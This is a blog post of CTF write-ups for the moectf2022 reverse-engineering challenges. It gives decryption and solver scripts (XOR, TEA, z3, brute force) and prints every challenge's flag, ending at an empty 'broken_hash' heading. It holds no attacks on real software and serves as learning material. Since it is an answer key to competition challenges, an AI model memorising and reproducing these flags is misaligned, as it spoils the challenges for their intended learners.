---
title: moectf2022
tags: ["game"]

---

moectf2022要来了,为了安利给学弟/朋友们,我把各个方向都做了做,以证明moe难度适中,适合入门

部分题目是吃老本做出来的，非新生角度，WEB和密码方向我几乎是零基础,通过搜索引擎也能做出部分题目,学习了不少新知识,moe确实有意思捏

<!--more-->

## re

### check in

> 描述:这是一道非常简单的签到题，借助IDA可以很快capture the flag~ 如果你不知道IDA是什么，可以借助搜索引擎来学习。群文件中有IDA，关于IDA使用可以看https://www.bilibili.com/video/BV1F54y1h7BS?p=4&share_source=copy_web（从15分钟开始看）

ida打开,按`shift + f12`找字符串就能找到

> moectf{Enjoy_yourself_in_Reverse_Engineering!!!}

### HEX

> 描述:查看文件16进制内容的工具:Notepad++,WinHex,010(推荐)

winhex打开,文件尾就是flag

> moectf{Hello_Hex}

### begin

> 描述:xor，异或，是一种神奇的运算。当用异或对一段数据进行加密，怎样才能将密文恢复成明文呢？ 搜索引擎会告诉你答案~加油吧

对输入的字符串进行异或

```c
#include <idc.idc>

static main()
{
    auto addr = 0x403020;
    auto i ,j;
    for(i=0;i<32;i++)
    {
        PatchByte(addr+i,Byte(addr+i)^0x19);
    }
}
```

> moectf{X0r_1s_s0_int3r3sting!!!!!}

### base

> 描述:base64可以将ascii表中无法显示的数转化为可以显示的数，进而方便在网络中进行传输qwq（建议百度查找一下原理）不过这个base有一点不一样哦

我是直接调试起来,下断点看内存拿出来的

> moectf{qwqbase_qwq}

### EquationPy

> 描述:python逆向是怎么一回事呢？pyc文件怎么逆向呢？ 悄悄告诉你，当你讨厌解方程时，z3会告诉你答案~

pyc(python字节码,由py源码编译而成,可以被解释器解释成机器码)用uncomply6可以将pyc字节码反编译成源码

反编译出源码后(稍微有点久),发现逻辑是判断flag是否为22位以及flag是否满足22个方程,看到解方程就用z3 ↓

```python
from z3 import *
flag = [Int('ipt%d' % i) for i in range(0,  22)]
solver = Solver()
solver.add(flag[0] == ord('m'))
solver.add(flag[1] == ord('o'))
solver.add(flag[2] == ord('e'))
solver.add(flag[3] == ord('c'))
solver.add(flag[4] == ord('t'))
solver.add(flag[5] == ord('f'))
solver.add(flag[6] == ord('{'))
solver.add(flag[21] == ord('}'))
solver.add(flag[0] * 7072 + flag[1] * 2523 + flag[2] * 6714 + flag[3] * 8810 + flag[4] * 6796 + flag[5] * 2647 + flag[6] * 1347 + flag[7] * 1289 + flag[8] * 8917 + flag[9] * 2304 + flag[10] * 5001 +
           flag[11] * 2882 + flag[12] * 7232 + flag[13] * 3192 + flag[14] * 9676 + flag[15] * 5436 + flag[16] * 4407 + flag[17] * 6269 + flag[18] * 9623 + flag[19] * 6230 + flag[20] * 6292 + flag[21] * 57 == 10743134)
solver.add(flag[0] * 3492 + flag[1] * 1613 + flag[2] * 3234 + flag[3] * 5656 + flag[4] * 9182 + flag[5] * 4240 + flag[6] * 8808 + flag[7] * 9484 + flag[8] * 4000 + flag[9] * 1475 + flag[10] * 2616 +
           flag[11] * 2766 + flag[12] * 6822 + flag[13] * 1068 + flag[14] * 9768 + flag[15] * 1420 + flag[16] * 4528 + flag[17] * 1031 + flag[18] * 8388 + flag[19] * 2029 + flag[20] * 2463 + flag[21] * 32 == 9663091)
solver.add(flag[0] * 9661 + flag[1] * 1108 + flag[2] * 2229 + flag[3] * 1256 + flag[4] * 7747 + flag[5] * 5775 + flag[6] * 5211 + flag[7] * 2387 + flag[8] * 1997 + flag[9] * 4045 + flag[10] * 7102 +
           flag[11] * 7853 + flag[12] * 5596 + flag[13] * 6952 + flag[14] * 8883 + flag[15] * 5125 + flag[16] * 9572 + flag[17] * 1149 + flag[18] * 7583 + flag[19] * 1075 + flag[20] * 9804 + flag[21] * 72 == 10521461)
solver.add(flag[0] * 4314 + flag[1] * 3509 + flag[2] * 6200 + flag[3] * 5546 + flag[4] * 1705 + flag[5] * 9518 + flag[6] * 2975 + flag[7] * 2689 + flag[8] * 2412 + flag[9] * 8659 + flag[10] * 5459 +
           flag[11] * 7572 + flag[12] * 3042 + flag[13] * 9701 + flag[14] * 4697 + flag[15] * 9863 + flag[16] * 1296 + flag[17] * 1278 + flag[18] * 5721 + flag[19] * 5116 + flag[20] * 4147 + flag[21] * 52 == 9714028)
solver.add(flag[0] * 2310 + flag[1] * 1379 + flag[2] * 5900 + flag[3] * 4876 + flag[4] * 5329 + flag[5] * 6485 + flag[6] * 6610 + flag[7] * 7179 + flag[8] * 7897 + flag[9] * 1094 + flag[10] * 4825 +
           flag[11] * 8101 + flag[12] * 9519 + flag[13] * 3048 + flag[14] * 3168 + flag[15] * 2775 + flag[16] * 4366 + flag[17] * 4066 + flag[18] * 7490 + flag[19] * 5533 + flag[20] * 2139 + flag[21] * 87 == 10030960)
solver.add(flag[0] * 1549 + flag[1] * 8554 + flag[2] * 6510 + flag[3] * 6559 + flag[4] * 5570 + flag[5] * 1003 + flag[6] * 8562 + flag[7] * 6793 + flag[8] * 3509 + flag[9] * 4965 + flag[10] * 6111 +
           flag[11] * 1229 + flag[12] * 5654 + flag[13] * 2204 + flag[14] * 2217 + flag[15] * 5039 + flag[16] * 5657 + flag[17] * 9426 + flag[18] * 7604 + flag[19] * 5883 + flag[20] * 5285 + flag[21] * 17 == 10946682)
solver.add(flag[0] * 2678 + flag[1] * 4369 + flag[2] * 7509 + flag[3] * 1564 + flag[4] * 7777 + flag[5] * 2271 + flag[6] * 9696 + flag[7] * 3874 + flag[8] * 2212 + flag[9] * 6764 + flag[10] * 5727 +
           flag[11] * 5971 + flag[12] * 5876 + flag[13] * 9959 + flag[14] * 4604 + flag[15] * 8461 + flag[16] * 2350 + flag[17] * 3564 + flag[18] * 1831 + flag[19] * 6088 + flag[20] * 4575 + flag[21] * 9 == 10286414)
solver.add(flag[0] * 8916 + flag[1] * 8647 + flag[2] * 4522 + flag[3] * 3579 + flag[4] * 5319 + flag[5] * 9124 + flag[6] * 9535 + flag[7] * 5125 + flag[8] * 3235 + flag[9] * 3246 + flag[10] * 3378 +
           flag[11] * 9221 + flag[12] * 1875 + flag[13] * 1008 + flag[14] * 6262 + flag[15] * 1524 + flag[16] * 8851 + flag[17] * 4367 + flag[18] * 7628 + flag[19] * 9404 + flag[20] * 2065 + flag[21] * 9 == 11809388)
solver.add(flag[0] * 9781 + flag[1] * 9174 + flag[2] * 3771 + flag[3] * 6972 + flag[4] * 6425 + flag[5] * 7631 + flag[6] * 8864 + flag[7] * 9117 + flag[8] * 4328 + flag[9] * 3919 + flag[10] * 6517 +
           flag[11] * 7165 + flag[12] * 6895 + flag[13] * 3609 + flag[14] * 3878 + flag[15] * 1593 + flag[16] * 9098 + flag[17] * 6432 + flag[18] * 2584 + flag[19] * 8403 + flag[20] * 4029 + flag[21] * 30 == 13060508)
solver.add(flag[0] * 2511 + flag[1] * 8583 + flag[2] * 2428 + flag[3] * 9439 + flag[4] * 3662 + flag[5] * 3278 + flag[6] * 8305 + flag[7] * 1100 + flag[8] * 7972 + flag[9] * 8510 + flag[10] * 8552 +
           flag[11] * 9993 + flag[12] * 6855 + flag[13] * 1702 + flag[14] * 1640 + flag[15] * 3787 + flag[16] * 8161 + flag[17] * 2110 + flag[18] * 5320 + flag[19] * 3313 + flag[20] * 9286 + flag[21] * 74 == 10568195)
solver.add(flag[0] * 4974 + flag[1] * 4445 + flag[2] * 7368 + flag[3] * 9132 + flag[4] * 5894 + flag[5] * 7822 + flag[6] * 7923 + flag[7] * 6822 + flag[8] * 2698 + flag[9] * 3643 + flag[10] * 8392 +
           flag[11] * 4126 + flag[12] * 1941 + flag[13] * 6641 + flag[14] * 2949 + flag[15] * 7405 + flag[16] * 9980 + flag[17] * 6349 + flag[18] * 3328 + flag[19] * 8766 + flag[20] * 9508 + flag[21] * 65 == 12514783)
solver.add(flag[0] * 4127 + flag[1] * 4703 + flag[2] * 6409 + flag[3] * 4907 + flag[4] * 5230 + flag[5] * 3371 + flag[6] * 5666 + flag[7] * 3194 + flag[8] * 5448 + flag[9] * 8415 + flag[10] * 4525 +
           flag[11] * 4152 + flag[12] * 1467 + flag[13] * 5254 + flag[14] * 2256 + flag[15] * 1643 + flag[16] * 9113 + flag[17] * 8805 + flag[18] * 4315 + flag[19] * 8371 + flag[20] * 1919 + flag[21] * 2 == 10299950)
solver.add(flag[0] * 6245 + flag[1] * 8783 + flag[2] * 6059 + flag[3] * 9375 + flag[4] * 9253 + flag[5] * 1974 + flag[6] * 8867 + flag[7] * 6423 + flag[8] * 2577 + flag[9] * 6613 + flag[10] * 2040 +
           flag[11] * 2209 + flag[12] * 4147 + flag[13] * 7151 + flag[14] * 1011 + flag[15] * 9446 + flag[16] * 4362 + flag[17] * 3073 + flag[18] * 3006 + flag[19] * 5499 + flag[20] * 8850 + flag[21] * 23 == 11180727)
solver.add(flag[0] * 1907 + flag[1] * 9038 + flag[2] * 3932 + flag[3] * 7054 + flag[4] * 1135 + flag[5] * 5095 + flag[6] * 6962 + flag[7] * 6481 + flag[8] * 7049 + flag[9] * 5995 + flag[10] * 6233 +
           flag[11] * 1321 + flag[12] * 4455 + flag[13] * 8181 + flag[14] * 5757 + flag[15] * 6953 + flag[16] * 3167 + flag[17] * 5508 + flag[18] * 4602 + flag[19] * 1420 + flag[20] * 3075 + flag[21] * 25 == 10167536)
solver.add(flag[0] * 1489 + flag[1] * 9236 + flag[2] * 7398 + flag[3] * 4088 + flag[4] * 4131 + flag[5] * 1657 + flag[6] * 9068 + flag[7] * 6420 + flag[8] * 3970 + flag[9] * 3265 + flag[10] * 5343 +
           flag[11] * 5386 + flag[12] * 2583 + flag[13] * 2813 + flag[14] * 7181 + flag[15] * 9116 + flag[16] * 4836 + flag[17] * 6917 + flag[18] * 1123 + flag[19] * 7276 + flag[20] * 2257 + flag[21] * 65 == 10202212)
solver.add(flag[0] * 2097 + flag[1] * 1253 + flag[2] * 1469 + flag[3] * 2731 + flag[4] * 9565 + flag[5] * 9185 + flag[6] * 1095 + flag[7] * 8666 + flag[8] * 2919 + flag[9] * 7962 + flag[10] * 1497 +
           flag[11] * 6642 + flag[12] * 4108 + flag[13] * 6892 + flag[14] * 7161 + flag[15] * 7552 + flag[16] * 5666 + flag[17] * 4060 + flag[18] * 7799 + flag[19] * 5080 + flag[20] * 8516 + flag[21] * 43 == 10435786)
solver.add(flag[0] * 1461 + flag[1] * 1676 + flag[2] * 4755 + flag[3] * 7982 + flag[4] * 3860 + flag[5] * 1067 + flag[6] * 6715 + flag[7] * 4019 + flag[8] * 4983 + flag[9] * 2031 + flag[10] * 1173 +
           flag[11] * 2241 + flag[12] * 2594 + flag[13] * 8672 + flag[14] * 4810 + flag[15] * 7963 + flag[16] * 7749 + flag[17] * 5730 + flag[18] * 9855 + flag[19] * 5858 + flag[20] * 2349 + flag[21] * 71 == 9526385)
solver.add(flag[0] * 9025 + flag[1] * 9536 + flag[2] * 1515 + flag[3] * 8177 + flag[4] * 6109 + flag[5] * 4856 + flag[6] * 6692 + flag[7] * 4929 + flag[8] * 1010 + flag[9] * 3995 + flag[10] * 3511 +
           flag[11] * 5910 + flag[12] * 3501 + flag[13] * 3731 + flag[14] * 6601 + flag[15] * 6200 + flag[16] * 8177 + flag[17] * 5488 + flag[18] * 5957 + flag[19] * 9661 + flag[20] * 4956 + flag[21] * 48 == 11822714)
solver.add(flag[0] * 4462 + flag[1] * 1940 + flag[2] * 5956 + flag[3] * 4965 + flag[4] * 9268 + flag[5] * 9627 + flag[6] * 3564 + flag[7] * 5417 + flag[8] * 2039 + flag[9] * 7269 + flag[10] * 9667 +
           flag[11] * 4158 + flag[12] * 2856 + flag[13] * 2851 + flag[14] * 9696 + flag[15] * 5986 + flag[16] * 6237 + flag[17] * 5845 + flag[18] * 5467 + flag[19] * 5227 + flag[20] * 4771 + flag[21] * 72 == 11486796)
solver.add(flag[0] * 4618 + flag[1] * 8621 + flag[2] * 8144 + flag[3] * 7115 + flag[4] * 1577 + flag[5] * 8602 + flag[6] * 3886 + flag[7] * 3712 + flag[8] * 1258 + flag[9] * 7063 + flag[10] * 1872 +
           flag[11] * 9855 + flag[12] * 4167 + flag[13] * 7615 + flag[14] * 6298 + flag[15] * 7682 + flag[16] * 8795 + flag[17] * 3856 + flag[18] * 6217 + flag[19] * 5764 + flag[20] * 5076 + flag[21] * 93 == 11540145)
solver.add(flag[0] * 7466 + flag[1] * 8442 + flag[2] * 4822 + flag[3] * 7639 + flag[4] * 2049 + flag[5] * 7311 + flag[6] * 5816 + flag[7] * 8433 + flag[8] * 5905 + flag[9] * 4838 + flag[10] * 1251 +
           flag[11] * 8184 + flag[12] * 6465 + flag[13] * 4634 + flag[14] * 5513 + flag[15] * 3160 + flag[16] * 6720 + flag[17] * 9205 + flag[18] * 6671 + flag[19] * 7716 + flag[20] * 1905 + flag[21] * 29 == 12227250)
solver.add(flag[0] * 5926 + flag[1] * 9095 + flag[2] * 2048 + flag[3] * 4639 + flag[4] * 3035 + flag[5] * 9560 + flag[6] * 1591 + flag[7] * 2392 + flag[8] * 1812 + flag[9] * 6732 + flag[10] * 9454 +
           flag[11] * 8175 + flag[12] * 7346 + flag[13] * 6333 + flag[14] * 9812 + flag[15] * 2034 + flag[16] * 6634 + flag[17] * 1762 + flag[18] * 7058 + flag[19] * 3524 + flag[20] * 7462 + flag[21] * 11 == 11118093)
solver.check()
result = solver.model()
# print(result)
for i in flag:
    print(chr(result[i].as_long()), end="")
```

> moectf{z3_i5_he1pful!}

### D_flat

> 描述:来学点音乐知识吧~ 你知道降D跟哪个音的音高相等吗？

C#的题目,要安装`.net 6.0 runtime`才能跑,逻辑在dll里,用ida打开是IL中间语言,有点麻烦,但也能看,可以参考一下→[.Net中的IL中间语言基本语法](http://t.zoukankan.com/ZengYunChun-p-6125500.html)

我用dnspy打开,flag直接突脸上了↓

```c#
using System;
using System.Text;

// Token: 0x02000002 RID: 2
internal class D_flate
{
	// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
	private static void Main()
	{
		int f = 0;
		int[] flag = new int[]
		{
			109,111,101,99,116,102,123,68,95,102,108,97,116,101,95,105,115,95,67,95,115,104,97,114,112,33,125
		};
		Console.WriteLine("In music theory, there is a note that has the same pitch as D flat.");
		Console.WriteLine("Do you know it?\nNow plz input your flag:");
		string input = Console.ReadLine();
		byte[] byteArray = Encoding.ASCII.GetBytes(input);
		for (int i = 0; i < input.Length; i++)
		{
			if (flag[i] == (int)byteArray[i])
			{
				f++;
			}
		}
		if (f == flag.Length)
		{
			Console.WriteLine("TTTTTQQQQQQLLLLLLL!!! This is your flag!");
			return;
		}
		Console.WriteLine("QwQ, plz try again.");
	}
}

```

> moectf{D_flate_is_C_sharp!}

### Android Cracker

> 描述:据小道消息，大黑阔ghost黑了DX的电脑，并在这道题里放了个backdoor！！！你能找到它吗？

JEB打开就有

> moectf{Andr01d_1s_so00oo_e@sy_t0_cr4ck!!!}

### ezTea

> 描述:无

改了delta值的TEA

TEA中对v1的处理只依赖此时的v0和sum,对v0的处理也只依赖此时的v1和sum,所以逆向只需要把加密的顺序倒过来即可(同时加变减)

```c
#include <stdio.h>
#include <stdint.h>

void encrypt(uint32_t *v, uint32_t *k)
{ // 主�?加密函数，试着搞定�?
     uint32_t v0 = v[0], v1 = v[1], sum = 0xd33b470 * 32; //sum修改了
     uint32_t delta = 0xd33b470;
     for (int i = 0; i < 32; i++)
     {
          v1 -= ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);  //顺序倒转,加法变减法
          v0 -= ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
          sum -= delta;
     }
     v[0] = v0;
     v[1] = v1;
}

int main()
{
     uint32_t k[4] = {1, 2, 3, 4};
     // scanf("%32s", input);   //将输入注释掉,使用加密后的数据作为解密算法的输入
     int8_t input[33] = {0x17, 0x65, 0x54, 0x89, 0xed, 0x65, 0x46, 0x32, 0x3d, 0x58, 0xa9, 0xfd, 0xe2, 0x5e,
                         0x61, 0x97, 0xe4, 0x60, 0xf1, 0x91, 0x73, 0xe9, 0xe9, 0xa2, 0x59, 0xcb, 0x9a, 0x99,
                         0xec, 0xb1, 0xe1, 0x7d};
     
     for (int i = 0; i < 32; i += 8)
     {
          uint32_t v[2] = {*(uint32_t *)&input[i], *(uint32_t *)&input[i + 4]};
          encrypt(v, k);
          for (int j = 0; j < 2; j++)
          { // 这一段主要是�?v 按单字节输出，另外可以了解一�?“大小�?序�?在这题是如何体现�?
               for (int k = 0; k < 4; k++)
               {
                    printf("%c", v[j] & 0xff); //此处修改了,不输出16进制,直接输出字符
                    v[j] >>= 8;
               }
          }
     }
     return 0;
}
```

> moectf{Th3_TEA_!S_s0_t4s7y~~!!!}

### fake_key

> 描述:眼见不一定为真，就像你看到的密钥。 程序中出现不确定的数字怎么办呢？调试就完事。

正向的逻辑是对flag进行了两次加密

第一次是根据key进行异或,逆向的时候异或回去即可

第二次是每一位加上伪随机数,随便搞一组数据调试一下求出伪随机数再减回去即可

```python
a = [0x15, 0x21, 0x0F, 0x19, 0x25, 0x5b, 0x19, 0x39, 0x5F, 0x3A, 0x3b, 0x30, 0x74, 0x07,
     0x43, 0x3F, 0x09, 0x5A, 0x34, 0x0C, 0x74, 0x3F, 0x1E, 0x2D, 0x27, 0x21, 0x12, 0x16, 0x1F]
rand = [1, 7, 4, 0, 9, 4, 8, 8, 2, 4, 5, 5, 1, 7,
        1, 1, 5, 2, 7, 6, 1, 4, 2, 3, 2, 2, 1, 6, 8]
b = []
for i in range(29):
    b.append(a[i]-rand[i])
key = "yunzh1junTCL,trackYYDS"
flag = ""
for i in range(len(a)):
    flag += chr((b[i] ^ ord(key[i % len(key)])))
print(flag)
```

> moectf{D3bug_t0_g3t_7he_Key!}

### EzRisc-V

> 描述:DX在tratra的电脑里发现了一个神必二进制文件，据说里面藏着tratra的秘密！但是DX太菜了，不会分析，作为一位逆向带师，你能帮帮他吗？

Risc-V用ida打开会报错

我用Ghidra打开,main函数是↓

逻辑就是异或0x39再和栈中的数据对比

```c
undefined8 main(void)
{
  undefined8 uStack112;
  undefined8 uStack104;
  undefined8 uStack96;
  undefined8 uStack88;
  undefined4 uStack80;
  undefined2 uStack76;
  undefined uStack74;
  byte abStack72 [52];
  int iStack20;
  
  uStack112 = 0x4b425f4d5a5c5654;
  uStack104 = 0x4a08664f145a4a08;
  uStack96 = 0x6656560909564a66;
  uStack88 = 0x4d4a5c4b5c4d5708;
  uStack80 = 0x18005708;
  uStack76 = 0x1818;
  uStack74 = 0x44;
  puts("Welcome to moeCTF 2022");
  puts("Plz input your flag:");
  __isoc99_scanf("%s",abStack72);
  iStack20 = 0;
  while( true ) {
    if (0x26 < iStack20) {
      printf("congratulations!!! you are right");
      return 0;
    }
    if ((abStack72[iStack20] ^ 0x39) != *(byte *)((longlong)&uStack112 + (longlong)iStack20)) break;
    iStack20 = iStack20 + 1;
  }
  printf("ops, wrong input!\nPlease try again");
  return 0;
}
```

```python
a = ["4b425f4d5a5c5654", "4a08664f145a4a08", "6656560909564a66",
     "4d4a5c4b5c4d5708", "18005708", "1818", "44"]
for i in a: # 从uStack112开始
    for j in range(len(i)-2, -2, -2): # 从数据的最低位开始
        print(chr(int(i[j:j+2], 16) ^ 0x39), end="") # 对每一字节都进行异或
```

> moectf{r1sc-v_1s_so00oo_1nterest1n9!!!}

### chicken_soup

> 描述:“欸嘿嘿嘿嘿\~题来咯\~欸，这这，这题都上了，你们怎么都不逆啊？” “云之君啊，大伙都不敢逆。DX神说，有人在这程序里下了毒，不能F5了。” “哎哟哟，你这人就喜欢开玩笑，哎呀，快逆吧，我不打扰了，我走了哈。” “你不能走。你要是没放毒，你就把这程序给我逆了。” “行，我逆，逆！哎呀，这F5，多是一件美事啊。啧啧啧，IDA一片飘红，肯定可以F5的。” “哎！tnnd为什么不逆！都不敢逆，都不敢F5是吧？既然大家都知道了，这戏我就不演了！这程序里的花指令，就是我放的！我就是要让你们都不能F5！”

main函数中间两个函数加了花指令无法f5,nop掉花指令即可

修复后的函数↓

函数一：每一位加上后一位的值

```c
unsigned int __cdecl sub_B1000(const char *a1)
{
  unsigned int result; // eax
  unsigned int i; // [esp+18h] [ebp-8h]

  for ( i = 0; ; ++i )
  {
    result = strlen(a1) - 1;
    if ( i >= result )
      break;
    a1[i] += a1[i + 1];
  }
  return result;
}
```

函数二：左移四位 或上 右移四位

以0xab为例 : 左移4位变为0xb0, 右移4位变为0x0a, 0xb0|0x0a = 0xba

```c
unsigned int __cdecl sub_B1080(const char *a1)
{
  unsigned int result; // eax
  unsigned int i; // [esp+18h] [ebp-8h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= strlen(a1) )
      break;
    a1[i] = (16 * a1[i]) | ((int)(unsigned __int8)a1[i] >> 4);
  }
  return result;
}
```

```python
data = [0xCD, 0x4D, 0x8C, 0x7D, 0xAD, 0x1E, 0xBE, 0x4A, 0x8A, 0x7D, 0xBC, 0x7C, 0xFC, 0x2E, 0x2A, 0x79, 0x9D, 0x6A, 0x1A,
        0xCC, 0x3D, 0x4A, 0xF8, 0x3C, 0x79, 0x69, 0x39, 0xD9, 0xDD, 0x9D, 0xA9, 0x69, 0x4C, 0x8C, 0xDD, 0x59, 0xE9, 0xD7]
a = []
for i in data:
    a.append((i << 4 | i >> 4) & 0xff)
b = []
tmp = a[len(a)-1]
for i in range(len(a)-1, -1, -1):
    b.append(tmp)
    tmp = a[i-1]-tmp
b = b[::-1]
for i in b:
    print(chr(i), end="")
```

> moectf{p4tch_pr0gr4m_t0_d3c0mpi1e_it!}

### fake_code

> 描述:云之君在track神的电脑里找到了他珍藏的flag，于是急匆匆拿出了文件想要逆出flag。 可是按照IDA反编译的伪C代码解密出来的全是乱码，这是怎么回事呢？ 幸好万能的track神告诉云之君，IDA也会骗人，这个伪C代码是假的，想要拿到flag只能分析汇编代码！ 悲剧的是，云之君是一个只会F5的家伙，一点汇编也看不懂呜呜呜，这可怎么办呢

yun已经在pdf中写了，通过在汇编中触发SEH异常来修改了程序逻辑

具体是在try块中使v5保留符号位右移7位，用右移的结果(符号位)做一次除法，如果v5的符号位为0，则触发除零异常，index进行ExceptHandler中的一系列变化

```python
data = [0x1E, 0x70, 0x7A, 0x6E, 0xEA, 0x83, 0x9E, 0xEF, 0x96, 0xE2, 0xB2, 0xD5, 0x99, 0xBB, 0xBB, 0x78, 0xB9, 0x3D, 0x6E, 0x38, 0x42, 0xC2, 0x86, 0xFF, 0x63,
        0xBD, 0xFA, 0x79, 0xA3, 0x6D, 0x60, 0x94, 0xB3, 0x42, 0x11, 0xC3, 0x90, 0x89, 0xBD, 0xEF, 0xD4, 0x97, 0xF8, 0x7B, 0x8B, 0x0B, 0x2D, 0x75, 0x7E, 0xDD, 0xCB]
byte = [0xAC, 0x04, 0x58, 0xB0, 0x45, 0x96, 0x9F, 0x2E, 0x41, 0x15, 0x18, 0x29, 0xB1, 0x33, 0xAA, 0x12, 0x0D, 0x89, 0xE6, 0xFA, 0xF3, 0xC4, 0xBD, 0xE7, 0x70, 0x8A, 0x94, 0xC1, 0x85, 0x9D, 0xA3, 0xF2, 0x3F, 0x82, 0x8E, 0xD7, 0x03, 0x93, 0x3D, 0x13, 0x05, 0x6B, 0x41, 0x03, 0x96, 0x76, 0xE3, 0xB1, 0x8A, 0x4A, 0x22, 0x55, 0xC4, 0x19, 0xF5, 0x55, 0xA6, 0x1F, 0x0E, 0x61, 0x27, 0xCB, 0x1F, 0x9E, 0x5A, 0x7A, 0xE3, 0x15, 0x40, 0x94, 0x47, 0xDE, 0x00, 0x01, 0x91, 0x66, 0xB7, 0xCD, 0x22, 0x64, 0xF5, 0xA5, 0x9C, 0x68, 0xA5, 0x52, 0x86, 0xBD, 0xB0, 0xDD, 0x76, 0x28, 0xAB, 0x16, 0x95, 0xC5, 0x26, 0x2C, 0xF6, 0x39, 0xBE, 0x00, 0xA5, 0xAD, 0xE3, 0x93, 0x9E, 0xE3, 0x05, 0xA0, 0xB0, 0x1D, 0xB0, 0x16, 0x0B, 0x5B, 0x33, 0x95, 0xA4, 0x09, 0x16, 0x87, 0x56, 0x1F, 0x83, 0x4E, 0x4A,
        0x3C, 0x55, 0x36, 0x6F, 0xBB, 0x4C, 0x4B, 0x9D, 0xB1, 0xAE, 0xE5, 0x8E, 0xC8, 0xFB, 0x0E, 0x29, 0x8A, 0xBB, 0xFC, 0x20, 0x62, 0x04, 0x2D, 0x80, 0x61, 0xD6, 0xC1, 0xCC, 0x3B, 0x89, 0xC5, 0x8B, 0xD5, 0x26, 0x58, 0xD6, 0xB6, 0xA0, 0x50, 0x75, 0xAB, 0x17, 0x83, 0x7F, 0x37, 0x2B, 0xA0, 0x1D, 0x2C, 0xCF, 0xC7, 0xE0, 0xE5, 0x49, 0xC9, 0xFA, 0x6B, 0xC0, 0x98, 0x66, 0x99, 0x92, 0x00, 0x02, 0xD4, 0x75, 0x46, 0x22, 0x05, 0x35, 0xD1, 0x4B, 0xC5, 0xAD, 0xE0, 0x8E, 0x45, 0x3B, 0x50, 0x15, 0xB5, 0x2E, 0x85, 0x30, 0x89, 0x54, 0x12, 0xDE, 0xF1, 0x5A, 0xF0, 0x2B, 0xA7, 0x1B, 0x4A, 0x26, 0x5D, 0x98, 0xD4, 0xA1, 0xBE, 0xD1, 0x4D, 0x7E, 0x38, 0xDE, 0x0B, 0x0A, 0x54, 0xB8, 0x73, 0x6D, 0xAD, 0x8C, 0x1E, 0xD9, 0x31, 0x5F, 0x56, 0x7E, 0xBD, 0x48, 0x32, 0x98, 0x2E, 0x3E, 0xEB, 0xA2, 0x1D]
v5 = 0
index = 0x19
a = []
for i in range(len(data)):
    v5 = (127*v5+102) % 255
    if(v5 >> 7 == 0):
        index = ((index*0x61+0x65) % 0xE9) ^ 0x29
    data[i] = data[i] ^ byte[index]
for i in data:
    print(chr(i), end="")
```

> moectf{Re4d_4ssemb1y_t0_g3t_the_m4gic_key_0f_Tr4ck}

### Art

> 描述:你好像能用IDA的F5很轻易地还原我的源码诶，这可不行。艺术是含蓄的，代码也要含蓄，所以我给程序穿了一件衣服来保护它！ 同时，艺术又是狂野的，因为艺术就是爆炸！所以呢……去爆破每一种可能吧！ PS:exe附件反编译出来的伪代码可能会更好看一些 :)

描述里已经说了有“衣服”，其实就是upx壳，upx -d filename脱壳即可

逻辑里有个%17逆向不了，爆破

```python
c = [0x02, 0x18, 0x0F, 0xF8, 0x19, 0x04, 0x27, 0xD8, 0xEB, 0x00, 0x35, 0x48, 0x4D, 0x2A,
     0x45, 0x6B, 0x59, 0x2E, 0x43, 0x01, 0x18, 0x5C, 0x09, 0x09, 0x09, 0x09, 0xB5, 0x7D]
b = "m"
before = ord('m')  # 第一位是m已知,作为第一个Str[i-1]
for i in range(1, 28):
    for j in range(33, 127):
        tmp = j  # Str[i-1]知道了,爆破Str[i]
        res = before ^ ((before % 17) + tmp) ^ 0x19
        if(res == c[i-1]):
            b += chr(j)
            before = j  # 更新Str[i-1]
            break
print(b)
```

> moectf{Art_i5_b14s7ing!!!!!}

### gogogo

> 描述:RX神轻易地攻破了DX的服务器，拿到了服务端程序，随便看了一眼，说这道题不是有手就行？

运行一下，让你访问http://localhost:8080/welcome然后显示消息: "Welcome to MoeCTF2022, can you find the flag?"

肯定是找不到的,ida打开看一看,没去符号表,稍微调了一下,发现用到了很多`github_com_gin`开头的函数,查了一下,是go的一个web框架[GO语言GIN框架入门](https://www.cnblogs.com/aresxin/p/GO-GIN.html)

将上文阅读了一点后,就能知道在访问http://localhost:8080/welcome时可能是`main.welcomeHandler`处理了GET请求,显示消息,源码可能如下:

```go
package main

import "github.com/gin-gonic/gin"

func main() {
    // 创建一个默认的路由引擎
    engine := gin.Default()
    // GET：请求方式；/welcome：请求的路径
    // 当客户端以GET方法请求/welcome路径时，会执行后面的匿名函数
    engine.GET("/welcome", func(context *gin.Context) {
        //返回JSON格式的数据
        context.JSON(200, gin.H{
            "message": "Welcome to MoeCTF2022, can you find the flag?",
        })
    })
    // 启动HTTP服务，默认在0.0.0.0:8080启动服务
    engine.Run()
}

```

而`main.findHandler`,`main.flagHandler`应该也类似,都是对请求进行处理

试了试访问http://localhost:8080/find,结果是 "password required"

调试了一会,发现请求/find接口的时候会先跑到`main_authRequired`处,取出GET请求的参数,和==---moeCTF2022---==对比,于是访问http://localhost:8080/find?password=---moeCTF2022---,结果是 "you are so close to get flag"

试了试http://localhost:8080/flag ,404了,调了好一会也不知道怎么进到`flagHandler`,查着查着试了试http://localhost:8080/find/flag?password=---moeCTF2022---,显示 "please input your flag and I will check it",成功进到`flagHandler`了



交叉引用发现函数表里的`main_check`,`main_AESEncrypt`,`main_PKCS5Padding`都和`flagHandler`有关

查资料的时候发现[golang中crypto/aes包 - 简书 (jianshu.com)](https://www.jianshu.com/p/43820e5c08c3) 调试过程中经过的函数和这个差不多:

```go
// 加密
func encryptAES(src []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }
    src = padding(src, block.BlockSize())
    blockMode := cipher.NewCBCEncrypter(block, key)
    blockMode.CryptBlocks(src, src)
    return src, nil
}
```

总结下来就是设立16位的==密钥 ---moeCTF2022---==,==PKCS5填充==输入的flag,选取==AES-128, CBC加密模式==,==偏移量 ---moeCTF2022---==

值得注意的是,ida并没有把`main_check`最后对比的参数反汇编出来,需要看汇编才能找到参数:

```
200c2c3ef00f31999df93d6919aa33e42dde307be02017ebf47067099ed0bddc525d5dba0f83c122159b89ae715907cc
```

拿去在线网站解一下就出了

> moeCTF{g0l@ng_1s_4n_1nte^est1n9_lan9ua9e}

### broken_hash

